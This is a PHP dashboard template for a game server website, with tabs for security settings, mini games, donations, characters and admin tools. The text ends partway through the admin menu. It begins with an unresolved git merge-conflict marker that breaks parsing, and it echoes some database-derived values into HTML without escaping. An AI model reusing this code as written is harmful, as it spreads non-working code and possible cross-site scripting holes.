<?php
<<<<<<< HEAD
if (session_status() === PHP_SESSION_NONE) { session_start(); }
require_once 'include/config.php';

// dashboard.php - Premium Glassmorphism Tabbed Management Panel
$tp_name = GetWebsiteOption('currency_name') ?: 'T-Points';
$tp_short = GetWebsiteOption('currency_short') ?: 'TP';
?>

<div id="dashboard-Modal" class="dashboard-modal">
    <div class="dashboard-wrapper blur-glass">
        <span class="close-btn desktop-only" onclick="closeModal('dashboard-Modal')">&times;</span>
        
        <?php if (!isset($_SESSION['username'])): ?>
            <div class="access-denied-state">
                <i class="fas fa-lock fa-3x gradient-text"></i>
                <h2>Access Denied</h2>
                <p>Please <a href="javascript:void(0);" onclick="closeModal('dashboard-Modal'); openModal('register-modal');" class="accent-link">Login</a> to access the management panel.</p>
            </div>
        <?php else: 
            $username = $_SESSION['username'];
            $acct = ['accountid' => 0, 'gd' => 0, 'mail' => 'N/A', 'pv' => 0, 'profile_photo' => null, 'google_2fa_enabled' => 0];
            try {
                $db_account = Connection('db_account');
                // Select all to safely check for column existence without crashing the query
                $stmt = $db_account->prepare("SELECT * FROM t_account WHERE name = ?");
                $stmt->execute([$username]);
                $res = $stmt->fetch(PDO::FETCH_ASSOC);
                if ($res) {
                    $acct['accountid'] = $res['accountid'] ?? 0;
                    $acct['gd'] = $res['gd'] ?? 0;
                    $acct['pv'] = $res['pv'] ?? 0;
                    $acct['profile_photo'] = $res['profile_photo'] ?? null;
                    $acct['google_2fa_enabled'] = $res['google_2fa_enabled'] ?? 0;
                    
                    // Email Fallback: check 'mail' then 'email'
                    if (!empty($res['mail'])) {
                        $acct['mail'] = $res['mail'];
                    } elseif (!empty($res['email'])) {
                        $acct['mail'] = $res['email'];
                    }
                }
                $account_id = $acct['accountid'];
            } catch (Exception $e) {
                $db_account = null;
                $account_id = 0;
            }

            try {
                $db_misc = Connection('db_misc');
            } catch (Exception $e) {
                $db_misc = null;
            }

            // Pending Donations Count
            $pending_count = 0;
            if ($db_misc && (IsAdministrator() || IsGameMaster())) {
                try {
                    $stmt_p = $db_misc->prepare("SELECT COUNT(*) as total FROM t_donations WHERE status = 'pending'");
                    $stmt_p->execute();
                    $pending_count = $stmt_p->fetch(PDO::FETCH_ASSOC)['total'];
                } catch (Exception $e) {
                    $pending_count = 0;
                }
            }

            // Check if user is an official streamer
            $is_official_streamer = false;
            if ($db_misc && $account_id > 0) {
                try {
                    $stmt_st_chk = $db_misc->prepare("SELECT COUNT(*) FROM t_streamers WHERE accountid = ? OR account_name = ?");
                    $stmt_st_chk->execute([$account_id, $username]);
                    if ($stmt_st_chk->fetchColumn() > 0) {
                        $is_official_streamer = true;
                    }
                } catch (Exception $e) {}
            }
        ?>
            <div class="dashboard-layout">
                <!-- Sidebar -->
                <div class="dashboard-sidebar" id="dashboardSidebar">
                    <div class="user-profile-brief">
                        <div class="avatar-ring">
                            <?php 
                            $avatar_url = "https://ui-avatars.com/api/?name=".urlencode($username)."&background=2ca4bf&color=fff&bold=true&rounded=true";
                            if (!empty($acct['profile_photo']) && file_exists(__DIR__ . '/' . $acct['profile_photo'])) {
                                $avatar_url = $acct['profile_photo'];
                            }
                            ?>
                            <img src="<?php echo $avatar_url; ?>" id="userAvatarSidebar" alt="Avatar" style="object-fit: cover;">
                        </div>
                        <h3><?php echo htmlspecialchars($username); ?></h3>
                        <p class="badge-accent"><i class="fas fa-gem"></i> <span id="userPointsSidebar"><?php echo isset($acct['gd']) ? $acct['gd'] : 0; ?></span> <?php echo $tp_short; ?></p>
                        <div class="mobile-only-info" style="font-size: 0.8rem; opacity: 0.7; margin-top: 10px; display: none;">
                            <div style="margin-bottom:5px;"><i class="fas fa-envelope"></i> <?php echo isset($acct['mail']) ? htmlspecialchars($acct['mail']) : 'N/A'; ?></div>
                            <div><i class="fas fa-check-circle" style="color:#2ecc71;"></i> Account: Active</div>
                        </div>
                    </div>
                    
                    <div class="dashboard-nav">
                        <button class="nav-btn active" onclick="openTab(event, 'Overview')">
                            <i class="fas fa-home neon-icon"></i> <span>Overview</span>
                        </button>
                        
                        <?php if (GetWebsiteOption('menu_security_visible') !== '0'): ?>
                        <button class="nav-btn" onclick="openTab(event, 'Security')">
                            <i class="fas fa-shield-alt neon-icon"></i> <span>Security</span>
                        </button>
                        <?php endif; ?>
                        
                        <?php if (GetWebsiteOption('menu_minigames_visible') !== '0'): ?>
                        <button class="nav-btn" onclick="openTab(event, 'MiniGames')">
                            <i class="fas fa-dice neon-icon" style="color:#e67e22; text-shadow: 0 0 10px rgba(230,126,34,0.5);"></i> <span style="color:#e67e22;">Mini Games</span>
                        </button>
                        <?php endif; ?>
                        
                        <?php if (GetWebsiteOption('menu_donations_visible') !== '0'): ?>
                        <button class="nav-btn" onclick="openTab(event, 'DonationTracking')">
                            <i class="fas fa-receipt neon-icon" style="color:#2ecc71;"></i> <span>Track Donations</span>
                        </button>
                        <button class="nav-btn" onclick="openTab(event, 'PointHistory')">
                            <i class="fas fa-history neon-icon"></i> <span>Point History</span>
                        </button>
                        <?php endif; ?>
                        
                        <?php if (GetWebsiteOption('menu_characters_visible') !== '0'): ?>
                        <button class="nav-btn" onclick="openTab(event, 'CharactersTab')">
                            <i class="fas fa-users neon-icon"></i> <span>Characters</span>
                        </button>
                        <?php endif; ?>
                        
                        <?php if (GetWebsiteOption('menu_rewards_visible') !== '0'): ?>
                        <button class="nav-btn" onclick="openTab(event, 'Rewards')">
                            <i class="fas fa-gift neon-icon"></i> <span>Rewards</span>
                        </button>
                        <?php endif; ?>

                        <button class="nav-btn" onclick="openTab(event, 'DownloadsTab')">
                            <i class="fas fa-download neon-icon" style="color: #2ca4bf;"></i> <span>Downloads</span>
                        </button>
                        
                        <?php if (GetWebsiteOption('menu_advanced_visible') !== '0'): ?>
                        <button class="nav-btn" onclick="openTab(event, 'Advanced')">
                            <i class="fas fa-cogs neon-icon"></i> <span>Advanced Actions</span>
                        </button>
                        <?php endif; ?>
                        <?php if ($is_official_streamer): ?>
                        <button class="nav-btn" onclick="openTab(event, 'MyStreamTab')" style="background: rgba(155, 89, 182, 0.15); border-left: 3px solid #9b59b6;">
                            <i class="fas fa-video neon-icon" style="color: #c084fc;"></i> <span style="color: #c084fc; font-weight: 700;">Manage My Stream</span>
                        </button>
                        <?php endif; ?>

                        <?php if (IsGameMaster() || IsAdministrator()): ?>
                            <button class="nav-btn admin-btn" onclick="openTab(event, 'AdminPanel')">
                                <i class="fas fa-user-shield neon-icon-red"></i> 
                                <span>Admin Tools</span>
                                <?php if ($pending_count > 0): ?>
                                    <span class="nav-badge" style="background: #ff4d4d; color: #fff; padding: 2px 6px; border-radius: 10px; font-size: 0.7rem; margin-left: 5px; box-shadow: 0 0 10px rgba(255,77,77,0.5);"><?php echo $pending_count; ?></span>
                                <?php endif; ?>
                            </button>
                        <?php endif; ?>
                        </div>

                        <!-- Mobile-only Sidebar Items -->
                        <div class="mobile-only-sidebar-links">
                            <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.05); margin: 15px 10px;">
                            <div class="mobile-sidebar-stats" style="display: none;">
                                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                                    <i class="fas fa-gem" style="color: #2ca4bf;"></i>
                                    <span><?php echo $tp_short; ?>: <strong id="userPointsSidebarMobile"><?php echo isset($acct['gd']) ? $acct['gd'] : 0; ?></strong></span>
                                </div>
                                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                                    <i class="fas fa-envelope" style="color: #2ca4bf;"></i>
                                    <span style="font-size: 0.85rem; opacity: 0.8;"><?php echo isset($acct['mail']) ? htmlspecialchars($acct['mail']) : 'N/A'; ?></span>
                                </div>
                                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
                                    <i class="fas fa-wifi" style="color: #2ecc71;"></i>
                                    <span style="font-size: 0.85rem; opacity: 0.8;">Status: Active</span>
                                </div>
                            </div>
                            <button class="nav-btn" onclick="closeModal('dashboard-Modal')" style="color: #f87171;">
                                <i class="fas fa-times"></i> <span>Close Panel</span>
                            </button>
                            <form action="logout.php" method="POST" style="width: 100%;">
                                <button type="submit" class="nav-btn" style="color: #60a5fa; width: 100%; border: none; background: transparent; text-align: left;">
                                    <i class="fas fa-sign-out-alt"></i> <span>Logout</span>
                                </button>
                            </form>
                        </div>
                </div>

                <!-- Main Content Area -->
                <div class="dashboard-content-area">
                    <!-- License Expiry Warning (5 days before) -->
                    <?php 
                    if (isset($_SESSION['pv']) && $_SESSION['pv'] >= 9) {
                        require_once __DIR__ . '/Functions/DomainGuard.php';
                        $expiryStatus = DomainGuard::GetExpiryStatus();
                        if ($expiryStatus['reason'] === 'near_expiry'): 
                    ?>
                    <div class="glass-card" style="background:rgba(239, 68, 68, 0.15); border:1px solid rgba(239, 68, 68, 0.4); margin-bottom:20px; padding:15px; border-radius:12px;">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <div style="display:flex; align-items:center; gap:15px;">
                                <i class="fas fa-hourglass-half fa-2x" style="color:#ef4444;"></i>
                                <div>
                                    <h4 style="margin:0; color:#fff;">Subscription Expiring Soon!</h4>
                                    <p style="margin:0; font-size:0.85rem; opacity:0.8;">Your license expires in <strong><?php echo $expiryStatus['days']; ?> days</strong>. Please renew to avoid service interruption.</p>
                                </div>
                            </div>
                            <div>
                                <button onclick="forceRecheckLicense(true)" class="btn-glow" style="padding:8px 15px; background:rgba(255,255,255,0.15); border:1px solid rgba(255,255,255,0.3); margin-right:10px; cursor:pointer;">
                                    <i class="fas fa-sync-alt"></i> FORCE RECHECK
                                </button>
                                <a href="https://fb.me/darkscorpiont" target="_blank" class="btn-glow" style="padding:8px 20px; background:#ef4444; border:none; text-decoration:none;">
                                    <i class="fab fa-facebook"></i> RENEW NOW
                                </a>
                            </div>
                        </div>
                    </div>
                    <?php endif; } ?>
                    <!-- Automated System Update Notification (Strict Owner Only) -->
                    <?php if (IsAdministrator() && isset($_SESSION['accountid']) && $_SESSION['accountid'] == 1): ?>
                    <div id="systemUpdateNotice" class="glass-card" style="display:none; position:relative; background:rgba(44, 164, 191, 0.1); border:1px solid rgba(44, 164, 191, 0.3); margin-bottom:20px; padding:15px; border-radius:12px; z-index:100; animation: glow 2s infinite alternate;">
                        <div style="display:flex; justify-content:space-between; align-items:center;">
                            <div style="display:flex; align-items:center; gap:15px;">
                                <i class="fas fa-cloud-download-alt fa-2x text-info"></i>
                                <div>
                                    <h4 style="margin:0; color:#fff;">System Update Available! <span id="updateVersionBadge" class="badge">v1.0.0</span></h4>
                                    <p style="margin:0; font-size:0.85rem; opacity:0.7;">New features and security patches are ready to be installed from GitHub.</p>
                                </div>
                            </div>
                            <button id="topUpdateBtn" class="btn-glow" style="padding:8px 20px;" onclick="doSystemUpdate()">
                                <i class="fas fa-sync-alt"></i> UPDATE NOW
                            </button>
                        </div>
                    </div>
                    <?php endif; ?>

                    <!-- Mobile Sidebar Toggle -->
                    <div class="admin-mobile-header mobile-only">
                        <button class="admin-menu-toggle" onclick="toggleAdminSidebar()">
                            <i class="fas fa-bars"></i> <span>Admin Menu</span>
                        </button>
                    </div>
                    
                    <!-- Overview Tab -->
                    <div id="Overview" class="tabcontent active-tab" style="display: block;">
                        <h2 class="section-title">Welcome back, <span class="gradient-text"><?php echo htmlspecialchars($username); ?></span>!</h2>
                        
                        <div class="stat-grid">
                            <div class="glass-card stat-card">
                                <div class="stat-icon"><i class="fas fa-gem"></i></div>
                                <div class="stat-info">
                                    <h4><?php echo $tp_name; ?></h4>
                                    <h2><span id="userPointsOverview"><?php echo isset($acct['gd']) ? $acct['gd'] : 0; ?></span></h2>
                                </div>
                            </div>
                            <div class="glass-card stat-card">
                                <div class="stat-icon"><i class="fas fa-envelope"></i></div>
                                <div class="stat-info">
                                    <h4>Email</h4>
                                    <p><?php echo isset($acct['mail']) ? htmlspecialchars($acct['mail']) : 'N/A'; ?></p>
                                </div>
                            </div>
                            <div class="glass-card stat-card status-online">
                                <div class="stat-icon"><i class="fas fa-wifi"></i></div>
                                <div class="stat-info">
                                    <h4>Account Status</h4>
                                    <p>Active</p>
                                </div>
                            </div>
                        </div>
                    </div>

                <!-- Security Tab -->
                    <!-- Security Tab -->
                    <div id="Security" class="tabcontent" style="display: none;">
                        <h2 class="section-title">Security Settings</h2>

                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
                            <!-- 2FA Management Section -->
                            <div class="glass-card form-card">
                                <h4><i class="fas fa-shield-alt"></i> Google Authenticator (2FA)</h4>
                                <p class="card-desc">Add an extra layer of security to your account.</p>
                                
                                <div id="2fa-status-area">
                                    <?php if ($acct && isset($acct['google_2fa_enabled']) && $acct['google_2fa_enabled'] == 1): ?>
                                        <div class="status-badge success"><i class="fas fa-check-circle"></i> 2FA is currently ENABLED</div>
                                        <div class="modern-form" style="margin-top:15px;">
                                            <div class="form-group">
                                                <input type="text" id="disable2faCode" placeholder="Enter 6-digit code">
                                                <label>Authenticator Code</label>
                                            </div>
                                            <button type="button" class="btn-glow red-glow" onclick="handle2FA('disable')">Disable 2FA</button>
                                        </div>
                                    <?php else: ?>
                                        <div class="status-badge warning"><i class="fas fa-exclamation-triangle"></i> 2FA is currently DISABLED</div>
                                        <button type="button" class="btn-glow" style="margin-top:15px;" onclick="handle2FA('setup')">Setup Google Authenticator</button>
                                    <?php endif; ?>
                                </div>

                                <div id="2fa-setup-area" style="display:none; text-align:center; margin-top:20px; padding:20px; background:rgba(0,0,0,0.2); border-radius:12px;">
                                    <p>1. Scan this QR code with Google Authenticator:</p>
                                    <div style="background:#fff; padding:10px; display:inline-block; border-radius:8px; margin:15px 0;">
                                        <img id="2fa-qr-img" src="" alt="QR Code" style="display:block;">
                                    </div>
                                    <p>Or enter manually: <strong id="2fa-secret-text" class="text-info"></strong></p>
                                    <div class="modern-form" style="margin-top:20px;">
                                        <div class="form-group">
                                            <input type="text" id="verify2faCode" placeholder="Enter code from app">
                                            <label>Verification Code</label>
                                        </div>
                                        <button type="button" class="btn-glow" onclick="handle2FA('confirm')">Verify & Enable</button>
                                    </div>
                                </div>

                                <div id="2fa-recovery-area" style="display:none; margin-top:20px; padding:20px; background:rgba(46, 204, 113, 0.1); border:1px solid rgba(46, 204, 113, 0.2); border-radius:12px;">
                                    <h4 class="text-success"><i class="fas fa-save"></i> 2FA Enabled Successfully!</h4>
                                    <p>Please save these recovery codes. You will need them if you lose access to your authenticator app:</p>
                                    <div id="recovery-codes-list" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:15px 0; font-family:monospace; font-size:1.1rem; color:#fff;"></div>
                                    <button type="button" class="btn-glow" onclick="location.reload()">I have saved them</button>
                                </div>
                            </div>

                            <!-- Change Password Section -->
                            <div class="glass-card form-card">
                                <h4><i class="fas fa-key"></i> Change Password</h4>
                                <p class="card-desc">Update your account password regularly for safety.</p>
                                <div class="modern-form">
                                    <?php if (!IsAdministrator()): ?>
                                    <div class="form-group">
                                        <input type="password" id="pass_old" required>
                                        <label>Current Password</label>
                                    </div>
                                    <?php endif; ?>
                                    <div class="form-group">
                                        <input type="password" id="pass_new" required>
                                        <label>New Password</label>
                                    </div>
                                    <div class="form-group">
                                        <input type="password" id="pass_confirm" required>
                                        <label>Confirm New Password</label>
                                    </div>
                                    <button type="button" class="btn-glow" onclick="handlePlayerSettings('change_password')">Update Password</button>
                                </div>
                            </div>

                            <!-- Change Email Section -->
                            <?php if (GetWebsiteOption('adv_email_visible') !== '0'): ?>
                            <div class="glass-card form-card">
                                <h4><i class="fas fa-envelope"></i> Change Email</h4>
                                <p class="card-desc">Update your primary contact email address.</p>
                                <div class="modern-form">
                                    <?php if (!IsAdministrator()): ?>
                                    <div class="form-group">
                                        <input type="password" id="email_old_pass" required>
                                        <label>Current Password</label>
                                    </div>
                                    <?php endif; ?>
                                    <div class="form-group">
                                        <input type="email" id="email_new" value="<?php echo htmlspecialchars($acct['email'] ?? ''); ?>" required>
                                        <label>New Email Address</label>
                                    </div>
                                    <button type="button" class="btn-glow" onclick="handlePlayerSettings('change_email')">Update Email</button>
                                </div>
                            </div>
                            <?php endif; ?>

                            <!-- Profile Picture Management -->
                            <div class="glass-card form-card">
                                <h4><i class="fas fa-camera"></i> Profile Picture</h4>
                                <p class="card-desc">Personalize your account with a custom avatar.</p>
                                
                                <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 20px;">
                                    <div class="avatar-ring" style="width: 80px; height: 80px; margin: 0;">
                                        <img src="<?php echo $avatar_url; ?>" id="settingsAvatarPreview" style="object-fit: cover;">
                                    </div>
                                    <div>
                                        <div style="display:flex; gap:10px;">
                                            <button id="btnUploadPic" class="btn-glow" onclick="document.getElementById('profilePicInput').click()">
                                                <i class="fas fa-upload"></i> Upload New
                                            </button>
                                            <button class="btn-glow" style="background:rgba(231, 76, 60, 0.2)!important; border-color:rgba(231, 76, 60, 0.3)!important;" onclick="resetProfilePic()">
                                                <i class="fas fa-trash-alt"></i> Reset
                                            </button>
                                        </div>
                                        <input type="file" id="profilePicInput" style="display: none;" accept="image/*" onchange="uploadProfilePic()">
                                        <p style="font-size: 0.75rem; opacity: 0.6; margin-top: 5px;">JPG, PNG or GIF. Max 2MB.</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Mini Games Tab -->
                    <div id="MiniGames" class="tabcontent" style="display: none;">
                        <h2 class="section-title"><i class="fas fa-dice text-warning"></i> Talisman Arcade</h2>
                        
                        <!-- Lobby View -->
                        <div id="minigameLobby" class="minigame-view">
                            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:20px;">
                                <?php
                                $activeGamesFound = false;
                                if ($db_misc) {
                                    try {
                                        $stmt_games = $db_misc->prepare("SELECT game_key, name, cost FROM t_website_minigames WHERE status = 'active'");
                                        $stmt_games->execute();
                                        $activeGames = $stmt_games->fetchAll(PDO::FETCH_ASSOC);

                                        foreach ($activeGames as $game) {
                                            $activeGamesFound = true;
                                            $gKey = $game['game_key'];
                                            $gName = $game['name'];
                                            
                                            // Map styles based on game key
                                            $icon = '<i class="fas fa-gamepad fa-3x gradient-text"></i>';
                                            $btnStyle = '';
                                            $desc = "Entry: " . number_format($game['cost']) . " " . $tp_short;
                                            $clickAction = "showGame('".explode('_', $gKey)[0]."')"; // Fallback mapping

                                            if ($gKey === 'spin_wheel') {
                                                $icon = '<i class="fas fa-sync-alt fa-3x gradient-text"></i>';
                                                $clickAction = "showGame('wheel')";
                                                $desc = "Test your luck with the magic wheel!";
                                            } elseif ($gKey === 'dice_master') {
                                                $icon = '<i class="fas fa-dice-six fa-3x" style="color:#2ecc71;"></i>';
                                                $clickAction = "showGame('dice')";
                                                $desc = "Predict the roll and multiply your points!";
                                                $btnStyle = 'background:#2ecc71!important;';
                                            } elseif ($gKey === 'lottery') {
                                                $icon = '<i class="fas fa-ticket-alt fa-3x" style="color:#f1c40f;"></i>';
                                                $clickAction = "showGame('lottery')";
                                                $desc = "Buy tickets for a chance at the JACKPOT!";
                                                $btnStyle = 'background:#f1c40f!important; color:#000!important;';
                                            }
                                ?>
                                            <div class="glass-card game-card" onclick="<?php echo $clickAction; ?>">
                                                <div class="game-icon"><?php echo $icon; ?></div>
                                                <h3><?php echo htmlspecialchars($gName); ?></h3>
                                                <p><?php echo htmlspecialchars($desc); ?></p>
                                                <button class="btn-glow" style="width:100%; margin-top:15px; <?php echo $btnStyle; ?>">
                                                    <?php echo ($gKey === 'lottery' ? 'BUY TICKETS' : 'PLAY NOW'); ?>
                                                </button>
                                            </div>
                                <?php
                                        }
                                    } catch (Exception $e) {
                                        echo "<div class='glass-card' style='grid-column: 1/-1; text-align:center;'><p>Error loading games.</p></div>";
                                    }
                                }
                                
                                if (!$activeGamesFound) {
                                    echo "<div class='glass-card' style='grid-column: 1/-1; text-align:center; padding: 40px; opacity: 0.6;'>";
                                    echo "<i class='fas fa-tools fa-3x' style='margin-bottom:15px;'></i>";
                                    echo "<h3>No Games Available</h3>";
                                    echo "<p>We're currently updating our arcade. Check back soon!</p>";
                                    echo "</div>";
                                }
                                ?>
                            </div>
                        </div>

                        <!-- Game Views (Hidden by default) -->
                        <div id="gameViewContainer" class="minigame-view" style="display:none;">
                            <button onclick="showLobby()" class="btn-action" style="margin-bottom:20px;"><i class="fas fa-arrow-left"></i> Back to Lobby</button>
                            
                            <div style="display:flex; flex-wrap:wrap; gap:20px;">
                                <!-- Game Content Area -->
                                <div id="activeGameArea" class="glass-card" style="flex:2; min-width:300px; text-align:center;">
                                    <!-- Dynamic content will be injected here -->
                                </div>
                                
                                <!-- Sidebar (Winners) -->
                                <div class="glass-card" style="flex:1; min-width:250px;">
                                    <h3><i class="fas fa-trophy text-warning"></i> Recent Winners</h3>
                                    <div id="winnersList" style="margin-top:15px; max-height:400px; overflow-y:auto;">
                                        <div class='loader'>Loading...</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Donation Tracking Tab -->
                    <div id="DonationTracking" class="tabcontent" style="display: none;">
                        <h2 class="section-title">Manual Donation Status</h2>
                        <div class="glass-card" style="padding:0; overflow:hidden; border: 1px solid rgba(255,255,255,0.1); border-radius:12px;">
                            <iframe src="legacy_panel.php?action=DonationStatus" style="width:100%; height:calc(100vh - 350px); border:none;" id="donationTrackerFrame"></iframe>
                        </div>
                    </div>

                    <!-- Point History Tab -->
                    <div id="PointHistory" class="tabcontent" style="display: none;">
                        <h2 class="section-title">Point & Activity Log</h2>
                        <div class="glass-card" style="padding:0; overflow:hidden; border: 1px solid rgba(255,255,255,0.1); border-radius:12px;">
                            <iframe src="legacy_panel.php?action=History" style="width:100%; height:calc(100vh - 350px); border:none;" id="playerHistoryFrame"></iframe>
                        </div>
                    </div>

                    <!-- Characters Tab -->
                    <div id="CharactersTab" class="tabcontent" style="display: none;">
                        <h2 class="section-title">Character Roster</h2>
                        <div class="char-roster-grid">
                            <?php
                            try {
                                $db_game = Connection('db_game');
                                $stmt_chars = $db_game->prepare("SELECT name, level, party, guild FROM t_user WHERE accountid = ?");
                                $stmt_chars->execute([$account_id]);
                                $chars = $stmt_chars->fetchAll(PDO::FETCH_ASSOC);
                            } catch (Exception $e) {
                                $chars = [];
                                echo "<div class='glass-card empty-state'><i class='fas fa-exclamation-triangle fa-2x'></i><p>Could not load characters (Game DB error).</p></div>";
                            }

                            if (empty($chars)) {
                                echo "<div class='glass-card empty-state'><i class='fas fa-user-slash fa-2x'></i><p>No characters found bound to this account.</p></div>";
                            } else {
                                foreach ($chars as $char) {
                                    $vocation = function_exists('Party2Vocation') ? Party2Vocation($char['party']) : "Level " . $char['level'];
                                    $iconPath = function_exists('GetClassFaceIcon') ? GetClassFaceIcon($char['party']) : 'images/classes/assasin.png';
                                    echo "<div class='glass-card char-card'>";
                                    echo "<div class='char-avatar'><img src='" . htmlspecialchars($iconPath) . "' alt='" . htmlspecialchars($vocation) . "' style='width: 100%; height: 100%; border-radius: 50%; object-fit: cover;'></div>";
                                    echo "<div class='char-details'>";
                                    echo "<h4>" . htmlspecialchars($char['name']) . "</h4>";
                                    echo "<span class='char-class'>" . $vocation . "</span>";
                                    echo "<span class='char-guild'><i class='fas fa-shield-alt'></i> " . ($char['guild'] ? htmlspecialchars($char['guild']) : "No Guild") . "</span>";
                                    echo "</div>";
                                    echo "</div>";
                                }
                            }
                            ?>
                        </div>
                    </div>

                    <!-- Rewards Tab -->
                    <div id="Rewards" class="tabcontent" style="display: none;">
                        <h2 class="section-title">Rewards & Bonuses</h2>
                        <?php if (GetWebsiteOption('adv_redeem_visible') !== '0'): ?>
                        <div class="glass-card form-card">
                            <h4><i class="fas fa-gift"></i> Claim Gift Code</h4>
                            <p class="card-desc">Enter your promotional code to receive exclusive items and <?php echo $tp_name; ?>.</p>
                            <div class="modern-form inline-form">
                                <div class="form-group">
                                    <input type="text" id="giftCode" required>
                                    <label>Gift Code</label>
                                </div>
                                <button type="button" class="btn-glow" onclick="handleAction('claim_code')">Claim Reward</button>
                            </div>
                        </div>
                        <?php else: ?>
                        <div class="glass-card" style="text-align:center; padding:40px; opacity:0.6;">
                            <i class="fas fa-eye-slash fa-3x" style="margin-bottom:15px;"></i>
                            <h3>Rewards Currently Unavailable</h3>
                            <p>Reward code redemptions are currently disabled by administrators.</p>
                        </div>
                        <?php endif; ?>
                    </div>

                    <!-- Downloads Tab -->
                    <div id="DownloadsTab" class="tabcontent" style="display: none;">
                        <h2 class="section-title">Game Downloads</h2>
                        <div class="glass-card" style="border: 1px solid rgba(44, 164, 191, 0.3); background: linear-gradient(135deg, rgba(44, 164, 191, 0.1) 0%, rgba(0, 0, 0, 0.4) 100%); padding: 30px;">
                             <div style="text-align: center; margin-bottom: 30px;">
                                <i class="fas fa-cloud-download-alt fa-4x" style="color: #2ca4bf; text-shadow: 0 0 20px rgba(44, 164, 191, 0.5);"></i>
                                <h3 style="margin-top: 15px; font-size: 1.8rem;">Ready for Adventure?</h3>
                                <p style="color: rgba(255,255,255,0.7);">Choose a download source below to get the latest game client.</p>
                             </div>
                             
                             <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;">
                                <?php for ($i = 1; $i <= 3; $i++): 
                                    $dl_url = GetSettingValue('dl_url_'.$i);
                                    $dl_title = GetSettingValue('dl_title_'.$i);
                                    if ($dl_url && $dl_url !== '#'):
                                ?>
                                    <div class="glass-card" style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05); text-align: center; padding: 25px; transition: 0.3s;" onmouseover="this.style.transform='translateY(-5px)'; this.style.borderColor='rgba(44,164,191,0.5)'" onmouseout="this.style.transform='translateY(0)'; this.style.borderColor='rgba(255,255,255,0.05)'">
                                        <i class="fas fa-file-archive fa-3x" style="color: #2ca4bf; margin-bottom: 15px;"></i>
                                        <h4 style="margin: 10px 0;"><?php echo htmlspecialchars($dl_title ?: 'Source '.$i); ?></h4>
                                        <a href="<?php echo htmlspecialchars($dl_url); ?>" target="_blank" class="btn-glow" style="width: 100%; display: block; padding: 12px; margin-top: 15px;">
                                            <i class="fas fa-download"></i> DOWNLOAD
                                        </a>
                                    </div>
                                <?php endif; endfor; ?>
                             </div>
                        </div>
                    </div>

                    <?php if ($is_official_streamer): ?>
                    <div id="MyStreamTab" class="tabcontent" style="display: none;">
                        <?php include __DIR__ . '/Actions/manage-my-stream.php'; ?>
                    </div>
                    <?php endif; ?>

                    <?php if (IsGameMaster() || IsAdministrator()): ?>
                    <div id="AdminPanel" class="tabcontent" style="display: none;">
                        <h2 class="section-title admin-title">Administration Panel <span class="badge">[Level: <?php echo $_SESSION['pv']; ?>]</span></h2>
                        

                        <!-- Admin/GM Legacy Integration Grid -->
                        <div class="admin-triple-grid">
                            <!-- Column 1: Navigation -->
                            <div class="legacy-nav-column glass-panel scrollable">
                                
                                <!-- 1. USER MANAGEMENT -->
                                <div class="accordion-header active" onclick="toggleAccordion(this)">
                                    <span><i class="fas fa-users-cog"></i> User Management</span>
                                    <i class="fas fa-chevron-down caret"></i>
                                </div>
                                <div class="accordion-content expanded" style="max-height: none;">
                                    <ul class="legacy-links-list">
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=accounts')"><i class="fas fa-database"></i> Accounts Database</a></li>
                                        <li><a href="javascript:void(0);" onclick="showGMManagement()"><i class="fas fa-user-shield text-warning"></i> Manage GM / Permissions</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=ChangeUserPass')"><i class="fas fa-user-edit"></i> Edit User Passwords</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=adminResetPw')"><i class="fas fa-search-plus"></i> Search & Reset Pass</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=PlayerPlayedTime')"><i class="fas fa-clock"></i> Player Played Time</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=History')"><i class="fas fa-history"></i> Transaction History</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=ipLogs')"><i class="fas fa-network-wired"></i> Player IP Logs</a></li>
                                    </ul>
                                </div>

                                <!-- 2. CHARACTER & GAME CONTROL -->
                                <div class="accordion-header" onclick="toggleAccordion(this)">
                                    <span><i class="fas fa-shield-alt"></i> Game & Character Control</span>
                                    <i class="fas fa-chevron-down caret"></i>
                                </div>
                                <div class="accordion-content">
                                    <ul class="legacy-links-list">
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=online')"><i class="fas fa-wifi"></i> Online List</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=characters')"><i class="fas fa-search"></i> Entity/Character Search</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=playerMailTracker')"><i class="fas fa-envelope-open-text"></i> Player Mail Tracker</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=lockAccount')"><i class="fas fa-ban"></i> Prison / Ban Control</a></li>
                                        <?php if (IsAdministrator()): ?>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=deleteCharacterByStaff')"><i class="fas fa-user-minus"></i> Delete Character</a></li>
                                        <li><a href="javascript:void(0);" onclick="loadAdminAction('legacy_panel.php?action=undeleteCharacter')"><i class="fas fa-trash-restore"></i> Restore Character</a></li>
                                        <?php endif; ?>
                                    </ul>
                                </div>

                                <!-- 3. ECONOMY & STORE -->
                                <?php if (IsAdministrator()): ?>
                                <div class="accordion-header" onclick="toggleAccordion(this)">
